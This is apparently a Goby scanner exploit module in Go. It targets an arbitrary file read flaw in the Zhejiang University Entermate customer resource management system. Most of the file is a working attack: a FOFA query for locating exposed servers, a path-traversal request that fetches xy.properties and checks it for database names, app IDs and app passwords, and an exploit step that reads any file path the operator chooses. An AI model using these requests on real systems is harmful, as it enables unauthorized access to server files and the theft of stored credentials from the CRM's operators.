package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhejiang University Entermate Customer Resource Management System /entsoft/module/i0004_openFileByStream.jsp File Read Vulnerability",
    "Description": "<p>The Zhejiang University Entermate Customer Resource Management System is a software product designed for enterprise customer resource management. The system aims to help enterprises efficiently manage and utilize customer resources, thereby enhancing sales and marketing effectiveness.</p><p>There exists an arbitrary file read vulnerability in the Zhejiang University Entermate Customer Resource Management System's i0004_openFileByStream.jsp. Attackers can exploit this vulnerability to read arbitrary files on the server and obtain sensitive information.</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2024-04-16",
    "PostTime": "2024-04-18",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"script/Ent.base.js\"",
    "GobyQuery": "body=\"script/Ent.base.js\"",
    "Level": "3",
    "Impact": "<p>There exists an arbitrary file read vulnerability in the Zhejiang University Entermate Customer Resource Management System's i0004_openFileByStream.jsp. Attackers can exploit this vulnerability to read arbitrary files on the server and obtain sensitive information.</p>",
    "Recommendation": "<p>Please stay updated by visiting the manufacturer's homepage: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/../EnterCRM/bin/xy.properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) G"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dbname",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "appid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "apppwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath={{{filepath}}}&filename=conan",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) G"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dbname",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|([\\s\\S]*)",
                "output|define|text|获取的信息是：{{{test}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 /entsoft/module/i0004_openFileByStream.jsp 文件读取漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源，提升销售和市场营销的效果。<br>浙大恩特客户资源管理系统&nbsp;i0004_openFileByStream.jsp&nbsp;存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。<br></p>",
            "Recommendation": "<p>请关注厂商主页更新:<a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p>",
            "Impact": "<p>浙大恩特客户资源管理系统&nbsp;i0004_openFileByStream.jsp&nbsp;存在任意文件读取漏洞，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Zhejiang University Entermate Customer Resource Management System /entsoft/module/i0004_openFileByStream.jsp File Read Vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>The Zhejiang University Entermate Customer Resource Management System is a software product designed for enterprise customer resource management. The system aims to help enterprises efficiently manage and utilize customer resources, thereby enhancing sales and marketing effectiveness.</p><p>There exists an arbitrary file read vulnerability in the Zhejiang University Entermate Customer Resource Management System's i0004_openFileByStream.jsp. Attackers can exploit this vulnerability to read arbitrary files on the server and obtain sensitive information.</p>",
            "Recommendation": "<p>Please stay updated by visiting the manufacturer's homepage: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p>",
            "Impact": "<p>There exists an arbitrary file read vulnerability in the Zhejiang University Entermate Customer Resource Management System's i0004_openFileByStream.jsp. Attackers can exploit this vulnerability to read arbitrary files on the server and obtain sensitive information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}